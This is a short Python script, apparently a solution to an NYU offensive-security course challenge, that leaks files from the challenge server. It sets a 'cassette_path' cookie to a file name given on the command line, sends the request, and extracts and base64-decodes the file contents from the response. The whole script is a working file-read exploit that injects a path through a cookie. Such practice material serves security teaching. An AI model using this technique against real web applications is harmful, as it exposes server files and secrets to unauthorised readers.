#!/usr/bin/env python3
import requests
import base64
import sys

def leak_file(file_name, verbose):
    headers = {
            "Host" : "offsec-chalbroker.osiris.cyber.nyu.edu:4000",
            "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language" : "en-US,en;q=0.5",
            "Accept-Encoding" : "gzip, deflate",
            "Referer" : "http://offsec-chalbroker.osiris.cyber.nyu.edu:4000/",
            "Cookie" : "CHALBROKER_USER_ID=jd3846; cassette_path=" + file_name, 
            "Upgrade-Insecure-Requests" : "1"
        }
    url = "http://offsec-chalbroker.osiris.cyber.nyu.edu:4000/?casset_path="
    r = requests.get(url, headers = headers)
    if r.status_code == 200:
        print("Success! Content:")
        contents = str(r.content)
        ind1 = contents.find("base64,") + 7
        ind2 = contents.find(">", ind1) - 1
        file_contents = contents[ind1:ind2]  
        if verbose:
            print(file_contents)
        file_contents = base64.b64decode(file_contents)
        print(file_contents)
        return 1
    else:
        print("Error getting file.")
        return 0
    


def main():
    file_name = sys.argv[1]
    try:
        verbose = sys.argv[2]
    except:
        verbose = 0
    leak_file(file_name, verbose)


if __name__ == "__main__":
    main()

